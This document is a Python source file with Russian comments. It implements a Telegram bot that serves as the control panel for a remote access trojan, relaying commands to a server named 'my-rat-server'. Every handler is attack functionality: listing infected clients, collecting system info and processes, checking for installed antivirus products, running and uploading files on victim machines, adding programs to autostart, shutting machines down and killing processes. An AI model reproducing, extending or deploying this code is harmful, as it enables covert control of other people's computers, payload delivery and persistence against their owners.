import telebot
import requests
from datetime import datetime

# Телеграм бот настройки
API_TOKEN = 'YOUR_TELEGRAM_BOT_API'
CHAT_ID = 'YOUR_CHAT_ID'  # Замените на ваш Chat ID
bot = telebot.TeleBot(API_TOKEN)

# Функция для отправки длинных сообщений по частям
def send_long_message(bot, chat_id, text, max_length=4096):
    if len(text) > max_length:
        # Разбиваем сообщение на части
        for i in range(0, len(text), max_length):
            bot.send_message(chat_id, text[i:i + max_length])
    else:
        bot.send_message(chat_id, text)

# Команда для получения списка всех подключенных клиентов
@bot.message_handler(commands=['list_clients'])
def handle_list_clients(message):
    response = requests.get('https://my-rat-server.herokuapp.com/list_clients')
    if response.status_code == 200:
        clients_data = response.json()
        if clients_data:
            clients_list = "\n".join([f"{node_name}: {info}" for node_name, info in clients_data.items()])
            bot.send_message(message.chat.id, f"Подключенные клиенты:\n{clients_list}")
        else:
            bot.send_message(message.chat.id, "Нет подключенных клиентов.")
    else:
        bot.send_message(message.chat.id, "Не удалось получить список клиентов.")

# Команда для получения информации о системе указанного клиента
@bot.message_handler(commands=['system_info'])
def handle_system_info(message):
    try:
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Пожалуйста, укажите node name после команды /system_info.")
            return
        node_name = parts[1]
        
        response = requests.get(f'https://my-rat-server.herokuapp.com/system_info/{node_name}')
        if response.status_code == 200:
            system_info = response.json()
            info_text = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
            send_long_message(bot, message.chat.id, info_text)
        else:
            bot.send_message(message.chat.id, f"Клиент с node name {node_name} не найден.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")

# Команда для получения запущенных процессов
@bot.message_handler(commands=['processes'])
def handle_processes(message):
    try:
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Пожалуйста, укажите node name после команды /processes.")
            return
        node_name = parts[1]
        
        response = requests.get(f'https://my-rat-server.herokuapp.com/processes/{node_name}')
        if response.status_code == 200:
            processes = response.json().get('result')
            send_long_message(bot, message.chat.id, processes)
        else:
            bot.send_message(message.chat.id, f"Клиент с node name {node_name} не найден.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")

# Команда для проверки антивирусов
@bot.message_handler(commands=['antiviruses'])
def handle_antiviruses(message):
    try:
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Пожалуйста, укажите node name после команды /antiviruses.")
            return
        node_name = parts[1]
        
        response = requests.get(f'https://my-rat-server.herokuapp.com/antiviruses/{node_name}')
        if response.status_code == 200:
            antiviruses = response.json().get('result')
            send_long_message(bot, message.chat.id, antiviruses)
        else:
            bot.send_message(message.chat.id, f"Клиент с node name {node_name} не найден.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")

# Команда для запуска файла в указанной директории
@bot.message_handler(commands=['run_file'])
def handle_run_file(message):
    try:
        parts = message.text.split(' ', 3)
        if len(parts) < 4:
            bot.send_message(message.chat.id, "Пожалуйста, укажите node name, директорию и имя файла после команды /run_file.")
            return
        node_name, directory, filename = parts[1], parts[2], parts[3]
        
        response = requests.post(f'https://my-rat-server.herokuapp.com/run_file/{node_name}', json={"directory": directory, "filename": filename})
        if response.status_code == 200:
            result = response.json().get('result')
            bot.send_message(message.chat.id, result)
        else:
            bot.send_message(message.chat.id, f"Ошибка при выполнении команды: {response.text}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")

# Команда для отправки файла в указанную директорию
@bot.message_handler(content_types=['document'])
def handle_send_file(message):
    try:
        parts = message.caption.split(' ', 1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Пожалуйста, укажите директорию после загрузки файла.")
            return
        
        directory = parts[1]
        file_info = bot.get_file(message.document.file_id)
        file_url = f"https://api.telegram.org/file/bot{API_TOKEN}/{file_info.file_path}"
        
        response = requests.post(f'https://my-rat-server.herokuapp.com/send_file/{directory}', json={"file_url": file_url})
        if response.status_code == 200:
            result = response.json().get('result')
            bot.send_message(message.chat.id, result)
        else:
            bot.send_message(message.chat.id, f"Ошибка при выполнении команды: {response.text}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")

# Команда для добавления в автозапуск
@bot.message_handler(commands=['add_startup'])
def handle_add_startup(message):
    try:
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Пожалуйста, укажите путь к файлу после команды /add_startup.")
            return
        file_path = parts[1]
        
        response = requests.post('https://my-rat-server.herokuapp.com/add_startup', json={"file_path": file_path})
        if response.status_code == 200:
            result = response.json().get('result')
            bot.send_message(message.chat.id, result)
        else:
            bot.send_message(message.chat.id, f"Ошибка при выполнении команды: {response.text}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")

# Команда для выключения компьютера
@bot.message_handler(commands=['shutdown'])
def handle_shutdown(message):
    try:
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Пожалуйста, укажите node name после команды /shutdown.")
            return
        node_name = parts[1]
        
        response = requests.post(f'https://my-rat-server.herokuapp.com/shutdown/{node_name}')
        if response.status_code == 200:
            result = response.json().get('result')
            bot.send_message(message.chat.id, result)
        else:
            bot.send_message(message.chat.id, f"Ошибка при выполнении команды: {response.text}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")

# Команда для закрытия процесса
@bot.message_handler(commands=['kill_process'])
def handle_kill_process(message):
    try:
        parts = message.text.split(' ', 2)
        if len(parts) < 3:
            bot.send_message(message.chat.id, "Пожалуйста, укажите node name и имя процесса или его PID после команды /kill_process.")
            return
        node_name, identifier = parts[1], parts[2]
        
        response = requests.post(f'https://my-rat-server.herokuapp.com/kill_process/{node_name}', json={"identifier": identifier})
        if response.status_code == 200:
            result = response.json().get('result')
            bot.send_message(message.chat.id, result)
        else:
            bot.send_message(message.chat.id, f"Ошибка при выполнении команды: {response.text}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")

# Управление через кнопки в телеграм боте
@bot.message_handler(commands=['menu'])
def handle_menu(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
    itembtn1 = telebot.types.KeyboardButton('/list_clients')
    itembtn2 = telebot.types.KeyboardButton('/system_info')
    itembtn3 = telebot.types.KeyboardButton('/processes')
    itembtn4 = telebot.types.KeyboardButton('/antiviruses')
    itembtn5 = telebot.types.KeyboardButton('/run_file')
    itembtn6 = telebot.types.KeyboardButton('/send_file')
    itembtn7 = telebot.types.KeyboardButton('/add_startup')
    itembtn8 = telebot.types.KeyboardButton('/shutdown')
    itembtn9 = telebot.types.KeyboardButton('/kill_process')
    markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9)
    bot.send_message(message.chat.id, "Выберите команду:", reply_markup=markup)

# Запуск бота
bot.polling()